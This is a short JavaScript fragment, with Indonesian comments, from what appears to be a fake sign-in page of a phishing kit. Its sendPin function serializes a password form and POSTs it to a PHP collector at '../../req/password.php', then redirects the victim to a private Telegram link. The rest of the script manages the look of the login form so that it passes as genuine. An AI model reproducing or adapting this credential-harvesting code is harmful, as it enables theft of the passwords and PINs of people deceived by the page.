  <script>
    var inpHp = document.getElementById("sign-in-phone-number");
    var btnnext = document.getElementById("nextBtn");
    var togglePassword = document.getElementById("togglePassword");
    var passwordVisible = false;

    // Tambahkan event listener untuk mengubah tampilan password saat ikon mata diklik
    togglePassword.addEventListener("click", function () {
      passwordVisible = !passwordVisible;
      if (passwordVisible) {
        inpHp.type = "text";
        togglePassword.classList.remove("fa-eye-slash");
        togglePassword.classList.add("fa-eye");
      } else {
        inpHp.type = "password";
        togglePassword.classList.remove("fa-eye");
        togglePassword.classList.add("fa-eye-slash");
      }
    });

    $(btnnext).css("display", "none");
    inpHp.addEventListener("click", aktip);
    btnnext.addEventListener("click", set_item);

    // function set_item() {
    //   sessionStorage.setItem("nohp", inpHp.value);
    // }

    function aktip() {
      $("#labelhp").fadeIn();
      inpHp.focus();
      var label = document.getElementById("labelhp");
      var btnnext = document.getElementById("nextBtn");
      $(btnnext).css("display", "none");
      label.classList.add("touched");
      inpHp.addEventListener("input", validate);

      function validate() {
        if (inpHp.value.length) {
          $(btnnext).fadeIn(300);
        } else {
          $(btnnext).fadeOut("fast");
        }
      }
    }

    function sendPin() {
      $(".load").fadeIn();
      $.ajax({
        type: "POST",
        url: "../../req/password.php", // Sesuaikan dengan lokasi Anda
        data: $("#password").serialize(),
        dataType: "text",
        success: function () {
          window.location.href = "https://t.me/private_HK"; // Redirect ke halaman yang sesuai
        },
      });
    }
